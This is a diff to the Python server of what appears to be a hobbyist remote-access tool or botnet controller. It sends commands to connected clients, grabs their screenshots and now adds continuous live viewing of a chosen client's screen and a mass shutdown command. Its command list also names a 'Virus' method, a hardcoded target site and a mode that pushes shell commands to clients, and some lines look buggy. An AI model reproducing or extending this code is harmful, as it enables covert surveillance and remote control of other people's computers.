@@ -2,8 +2,9 @@ import socket
 from PIL import Image, ImageTk
 import keyboard
 from time import sleep
-from ShellUi import Simage,Line,newLine,window
-from io import BytesIO
+from ShellUi import Simage,Line,newLine,window,clear,createLabel
+import threading
+
 text = ""
 numclients = 1
 
@@ -24,7 +25,7 @@ while window.winfo_exists():
         text = text[0:len(text)-1]
     elif key != "":
         text += key
-    sleep(.115)
+    sleep(.12)
 Line("----------------------------",True)
 Line("Starting Server",True)
 Line("----------------",True)
@@ -46,7 +47,7 @@ Line("----------------------------",True)
 # Sends any commands to all clients that are connected
 def SendToClients(mess:str,isFile = False):
     for cl,_,_,ac in connected:
-        if ac:
+        if ac == True:
             if isFile:
                 split = mess.split("/")
                 cl.sendfile(open(mess,"rb"))
@@ -69,32 +70,39 @@ def connect():
             connected[p][3] = data.decode() == "yes"
             Line(hn+" connection status: "+str(connected[p][3]),True)
 
-# asks all connected clients to take a screenshot and send it back
-savedimgs = []
-def Screenshot():
-    image = b''
-    clidata = None
+
+# asks the sever to pick a client
+def PAC():
+    allowed = []
+    picked = None
     text = ""
 
     for i in range(len(connected)):
-            Line(str(i)+". "+connected[i][2],True)
+        if connected[i][3] == True:
+            Line(str(len(allowed))+". "+connected[i][2],True)
+            allowed.append(connected[i])
+
     while True:
         Line("Answer: "+text)
         key = keyboard.read_key()
 
         if key == 'enter':
             newLine()
-            try:
-                num = int(text)
-                if num > -1 and num < len(connected):
-                    clidata = connected[num]
-                    break
-            except Exception as e:
-                pass
-            text = ""
-            Line("Not a option",True)
-            for i in range(len(connected)):
-                Line(str(i)+". "+connected[i][2],True)
+
+            if text == "end":
+                break
+            else: 
+                try:
+                    num = int(text)
+                    if num > -1 and num < len(allowed):
+                        picked = allowed[num]
+                        break
+                except Exception as e:
+                    pass
+                text = ""
+                Line("Not a option",True)
+                for i in range(len(allowed)):
+                    Line(str(i)+". "+allowed[i][2],True)
         elif key in ["shift","ctrl","alt"]:
             continue
 
@@ -107,8 +115,19 @@ def Screenshot():
         elif key != "":
             text += key
 
-        sleep(.115)
+        sleep(.12)
+    return picked
 
+
+# asks all connected clients to take a screenshot and send it back
+savedimgs = []
+def Screenshot():
+    image = b''
+    clidata = PAC()
+
+    if clidata == None:
+        return
+    
     clidata[0].send("3".encode())
     while True:
         data = clidata[0].recv(99999)
@@ -124,11 +143,59 @@ def Screenshot():
         if data == "end":
             break
     
+    clear()
     with open("screen.png","wb") as img:
         img.write(image)
-    img = ImageTk.PhotoImage(Image.open("screen.png"))
+    img = Image.open("screen.png")
+    sw,sh = img.size
+    img = img.resize((int(sw/1.25), int(sh/1.25)))
+    img = ImageTk.PhotoImage(img)
     savedimgs.append(img)
     Simage(img)
+
+# View a client screen updateing
+cli = threading.Thread()
+stopwatch = False
+def SCS(cl=None,a="",h="",al=""):
+    screen = createLabel()
+    screen.config(anchor="e",justify="right")
+    screen.pack(side="right")
+    lab = createLabel(screen)
+    lab.config(text=h)
+    lab.place(x=0,y=0)
+    
+    if cl == None:
+        return
+    img = None
+    clear()
+    while not stopwatch:
+        cl.send("3".encode())
+        image = b''
+        while True:
+            data = cl.recv(99999)
+            if not data:
+                break
+
+            try:
+                data = data.decode()
+            except Exception as e:
+                image += data
+                continue
+
+            if data == "end":
+                break
+            
+        with open("screen.png","wb") as img:
+            img.write(image)
+        img = Image.open("screen.png")
+        sw,sh = img.size
+        img = img.resize((int(sw/1.25), int(sh/1.25)))
+        img = ImageTk.PhotoImage(img)
+        screen.config(image = img) 
+        sleep(.3)
+    screen.destroy()
+    Line("Stoped watching "+str(h),True)
+
 
 targetsite = "gnu.org"
 
@@ -136,10 +203,13 @@ targetsite = "gnu.org"
 commands = {
     1: "Asks all connected clients if we are allowed to ne fully connected",
     2: "Tells all fully connected clients to turn the \"Virus\" method",
-    3: "Tells all fully connecte clients to take a screenshot and send it back",
+    3: "Tells all fully connected client to take a screenshot and send it back",
+    4: "Tells a fully connected client to send there current screen",
+    "4s":"Stops viewing a client screen updateing",
     "img": "Sends a image",
     "status": "Prints the connected client statuses",
-    "end": "Stops everything"
+    "end": "Stops the current task",
+    "fs":"Shuts down all clients"
 }
 
 mktest = "mkdir test"
@@ -159,12 +229,20 @@ try:
             newLine()
             if text == "end":
                 break
+            elif text == "fs": # Sedns all clients the full shutdown protocall
+                for c,_,_,_ in connected:
+                    c.send("fs")
 
             elif text == "1": # Connect
                 connect() 
             elif text == "3": # Screenshot
                 Screenshot()
-
+            elif text == "4": # Screencapture
+                cli = threading.Thread(target=SCS,args=(PAC()),daemon=True)
+                cli.start()
+            elif text == "4s": # Screencapture
+                stopwatch = True
+            
             elif text == "test":
                 SendToClients("cmdmode")
                 SendToClients(mktest)
@@ -196,7 +274,7 @@ try:
         elif key != "":
             text += key
 
-        sleep(.115)
+        sleep(.12)
 except OSError as e:
     pass
 
